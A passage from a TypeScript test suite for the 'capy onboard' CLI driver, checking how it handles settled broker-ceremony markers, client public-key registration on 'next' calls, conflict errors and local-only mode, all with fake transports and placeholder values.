    const fragment = JSON.parse(Buffer.from(b64, 'base64url').toString('utf8'));
    expect(fragment.first_run.mint_org_id).toBe('org_xyz');
  });

  test('a settled "done" marker carrying an orgId is reported to the service as this step\'s result.org_id on the NEXT /next call', async () => {
    const keypair = mintConnectionKeypair();
    const ceremonyDir = mkdtempSync(join(require('os').tmpdir(), 'capy-driver-ceremony-target-'));

    // Seeded BEFORE the driver ever runs — mirrors the worker having already
    // settled this exact connection in an EARLIER `capy onboard` invocation
    // against this same directory (S1-resume-ceremony).
    writeCeremonyMarker(ceremonyDir, {
      state: 'done',
      url: `${keepOrigin()}/flow/sandbox-session?c=conn-org-1#r=x`,
      connectionId: 'conn-org-1',
      createdAt: Date.now(),
      targetDir: ceremonyDir,
      orgId: 'org-from-marker',
      // create_org mints a default project alongside the org — the marker
      // carries it so the report pins BOTH (the write phase must never hit
      // the adopt-vs-create project picker on a decision the mint made).
      projectId: 'proj-from-marker',
    });

    const sandboxStep = envelope({
      kind: 'screen',
      screen: 'sandbox_session',
      url: `${keepOrigin()}/flow/sandbox-session?c=conn-org-1`,
      params: { connection_id: 'conn-org-1', user_code: 'BCDF-GHJK' },
    });
    const doneStep = envelope({ kind: 'done', params: {} });
    const { transport, reports } = fakeTransport([sandboxStep, doneStep]);
    const { map } = recordingExecutors();

    try {
      await runOnboardFlow({
        targetDir: ceremonyDir,
        transport,
        executors: map,
        observe: observeStub(),
        authMode: 'broker_ceremony',
        clientPubkey: keypair.publicKeyB64,
        brokerCeremonyKeypair: keypair,
        serviceUrl: 'https://api.test.invalid',
        flowSecret: 'flow-secret-org-1',
      });
    } finally {
      rmSync(ceremonyDir, { recursive: true, force: true });
    }

    // The SECOND /next call is the one that reports back on the settled
    // ceremony step — its last_step.result must carry the org AND project
    // the marker resolved, the same shape any other 'ok' local_action
    // reports (the project id is what drives the service's project pin).
    expect(reports.length).toBe(2);
    expect(reports[1].last_step?.outcome).toBe('ok');
    expect(reports[1].last_step?.result).toEqual({
      org_id: 'org-from-marker',
      project_id: 'proj-from-marker',
    });
  });

  // Bug D residual (CAPY-ONBOARD-SESSION-DUMP.md §3): org-create failing on
  // the Keep page (or the CLI) leaves a ceremony settled 'ok' with NO org.
  // Reporting that upstream would let the flow advance into the zero-org
  // refusal (capyCommand.ts's `noWizardStops` gate) with no way back to
  // Keep. The driver must instead re-issue the SAME connection as a fresh
  // screen — never a single `/next` call reporting this as done.
  test('a settled "done" marker with NO orgId re-issues a fresh screen for the SAME connection, never reports upstream', async () => {
    const keypair = mintConnectionKeypair();
    const ceremonyDir = mkdtempSync(join(require('os').tmpdir(), 'capy-driver-ceremony-target-'));

    // Seeded as if the worker's ceremony resolved (session created) but
    // org-create did not — 'done', no `orgId` field at all.
    writeCeremonyMarker(ceremonyDir, {
      state: 'done',
      url: `${keepOrigin()}/flow/sandbox-session?c=conn-noorg-1#r=x`,
      connectionId: 'conn-noorg-1',
      createdAt: Date.now(),
      targetDir: ceremonyDir,
    });

    const sandboxStep = envelope({
      kind: 'screen',
      screen: 'sandbox_session',
      url: `${keepOrigin()}/flow/sandbox-session?c=conn-noorg-1`,
      params: { connection_id: 'conn-noorg-1', user_code: 'BCDF-GHJK' },
    });
    const { transport, calls: callCount } = fakeTransport([sandboxStep]);
    const { map, calls } = recordingExecutors();

    const spawnCalls: Array<{ command: string; args: string[] }> = [];
    const fakeSpawnImpl = ((command: string, args: string[]) => {
      spawnCalls.push({ command, args });
      return {
        stdin: { write: () => true, end: () => undefined },
        unref: () => undefined,
      } as unknown as ReturnType<typeof import('child_process').spawn>;
    }) as typeof import('child_process').spawn;

    let result: Awaited<ReturnType<typeof runOnboardFlow>>;
    try {
      result = await runOnboardFlow({
        targetDir: ceremonyDir,
        transport,
        executors: map,
        observe: observeStub(),
        authMode: 'broker_ceremony',
        clientPubkey: keypair.publicKeyB64,
        brokerCeremonyKeypair: keypair,
        serviceUrl: 'https://api.test.invalid',
        flowSecret: 'flow-secret-noorg-1',
        ceremonySpawnImpl: fakeSpawnImpl,
        ceremonyResolveCommand: () => ({ command: 'node', args: ['cli-entry.js'] }),
      });
    } finally {
      rmSync(ceremonyDir, { recursive: true, force: true });
    }

    // A screen, not a refusal — the SAME connection, ready for another
    // attempt at creating the org on Keep.
    expect(result.step.kind).toBe('screen');
    expect(result.step.screen).toBe('sandbox_session');
    expect(result.step.params.connection_id).toBe('conn-noorg-1');
    // Never advanced past this step: no executor ran, and the service was
    // never told this outcome (still just the one `/next` that returned the
    // original screen — the retry is entirely local).
    expect(calls).toEqual([]);
    expect(callCount()).toBe(1);
    // A fresh worker WAS spawned for another attempt.
    expect(spawnCalls.length).toBe(1);
  });

  test('the SAME screen, with no brokerCeremonyKeypair, still stops exactly as before (additive-only)', async () => {
    const sandboxStep = envelope({
      kind: 'screen',
      screen: 'sandbox_session',
      url: `${keepOrigin()}/flow/sandbox-session?c=conn-1`,
      params: { connection_id: 'conn-1', user_code: 'BCDF-GHJK' },
    });
    const { transport } = fakeTransport([sandboxStep]);
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
    });

    expect(result.step.kind).toBe('screen');
    expect(result.step.params.connection_id).toBe('conn-1');
    expect(calls).toEqual([]);
  });
});

describe('the flow-owned pubkey registration: `client_pubkey` on `next` while a broker-ceremony keypair is held', () => {
  // A `--flow-id`/`--flow-secret` RESUME never calls `create` at all — the
  // only place this process's own ephemeral keypair (minted BEFORE this run,
  // by `capy onboard --broker-ceremony`) could ever reach the service is on
  // a `next` report. Without this, a resumed process's key never arrives and
  // a ceremony sealed to it is unusable.
  test('a RESUME sends client_pubkey on every next report, with no create call at all', async () => {
    const keypair = mintConnectionKeypair();
    const { transport, reports, created } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' } }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const { map } = recordingExecutors();

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      flowId: FLOW_ID,
      flowSecret: 'resumed-secret',
      brokerCeremonyKeypair: keypair,
    });

    expect(created).toEqual([]);
    expect(reports.length).toBe(2);
    expect(reports[0].client_pubkey).toBe(keypair.publicKeyB64);
    expect(reports[1].client_pubkey).toBe(keypair.publicKeyB64);
  });

  // The self-mint (CREATE) case already registers this same key at create —
  // unchanged. Re-sending it on `next` too is the documented idempotent
  // no-op on the service side; this asserts the create body itself is
  // untouched by this change.
  test('a CREATE with a broker-ceremony keypair still carries client_pubkey at create exactly as before, and now also on next', async () => {
    const keypair = mintConnectionKeypair();
    const { transport, reports, created } = fakeTransport([envelope({ kind: 'done', params: {} })]);
    const { map } = recordingExecutors();

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      authMode: 'broker_ceremony',
      clientPubkey: keypair.publicKeyB64,
      brokerCeremonyKeypair: keypair,
    });

    expect(created.length).toBe(1);
    expect(created[0].client_pubkey).toBe(keypair.publicKeyB64);
    expect(reports.length).toBe(1);
    expect(reports[0].client_pubkey).toBe(keypair.publicKeyB64);
  });

  // Every other caller — TTY, `--web`, the existing explicit `--client-pubkey`
  // caller with no keypair of its own — leaves `brokerCeremonyKeypair` unset.
  // `next` must carry no `client_pubkey` at all for them: additive-only.
  test('with no brokerCeremonyKeypair, next never carries client_pubkey', async () => {
    const { transport, reports } = fakeTransport([envelope({ kind: 'done', params: {} })]);
    const { map } = recordingExecutors();

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
    });

    expect(reports.length).toBe(1);
    expect(reports[0].client_pubkey).toBeUndefined();
  });

  // The service refuses a `next` report offering a DIFFERENT client_pubkey
  // than the one already registered for this instance with a coded 409. That
  // is fatal for this process — there is nothing to retry into, since the
  // ceremony is sealed to a key this process cannot change — so it must
  // propagate as-is (the service's own code intact) rather than being
  // swallowed or retried.
  test('a 409 CLIENT_PUBKEY_CONFLICT on next propagates as-is, coded, with no retry', async () => {
    const keypair = mintConnectionKeypair();
    let attempts = 0;
    const transport: FlowTransport = {
      async create() {
        return {
          flow_id: FLOW_ID,
          flow_type: 'onboard',
          contract_version: FLOW_CONTRACT_VERSION,
          binding: 'anonymous',
          step: null,
        };
      },
      async next() {
        attempts += 1;
        throw new FlowHttpError(409, 'CLIENT_PUBKEY_CONFLICT');
      },
      async confirm() {
        return { recorded: true };
      },
      async cancel() {
        /* nothing */
      },
    };
    const { map } = recordingExecutors();

    let caught: unknown;
    try {
      await runOnboardFlow({
        targetDir: '/tmp/x',
        transport,
        executors: map,
        observe: observeStub(),
        flowId: FLOW_ID,
        flowSecret: 'resumed-secret',
        brokerCeremonyKeypair: keypair,
      });
    } catch (err) {
      caught = err;
    }

    expect(caught).toBeInstanceOf(FlowHttpError);
    expect((caught as FlowHttpError).status).toBe(409);
    expect((caught as FlowHttpError).code).toBe('CLIENT_PUBKEY_CONFLICT');
    // Exactly one attempt — the loop does not retry into a conflict it
    // cannot resolve itself.
    expect(attempts).toBe(1);
  });
});

describe('driver: local-only mode never reaches the service', () => {
  afterEach(() => {
    mock.restore();
  });

  test('refuses before creating anything', async () => {
    mock.module('../../src/config/profileConfig', () => ({
      isLocalOnly: () => true,
      resolveActiveUrl: () => 'http://localhost:3001',
    }));
    // Re-import so the driver picks up the mocked module.
    const { runOnboardFlow: driver } = await import('../../src/flows/onboard/driver');

    const { transport, created, calls } = fakeTransport([envelope({ kind: 'done', params: {} })]);
    await expect(
      driver({ targetDir: '/tmp/x', transport, executors: recordingExecutors().map, observe: observeStub() }),
    ).rejects.toThrow();
    expect(created).toEqual([]);
    expect(calls()).toBe(0);
  });
});
